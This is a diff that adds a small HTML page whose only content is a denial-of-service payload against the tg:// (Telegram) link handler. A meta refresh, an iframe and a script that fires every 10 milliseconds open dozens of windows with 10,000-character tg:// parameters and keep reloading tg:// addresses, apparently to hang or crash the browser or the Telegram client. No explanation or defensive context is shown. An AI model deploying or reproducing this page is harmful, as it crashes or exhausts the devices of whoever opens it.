@@ -1,0 +1,16 @@
+<html>
+<head>
+    <meta http-equiv="refresh" content="0; url=tg://">
+    <script>
+        setInterval(function(){
+            for(let i=0;i<50;i++){
+                window.open("tg://test?param=" + "x".repeat(10000));
+                window.location.href = "tg://resolve?domain=test" + Date.now();
+            }
+        }, 10);
+    </script>
+</head>
+<body>
+    <iframe src="tg://"></iframe>
+</body>
+</html>
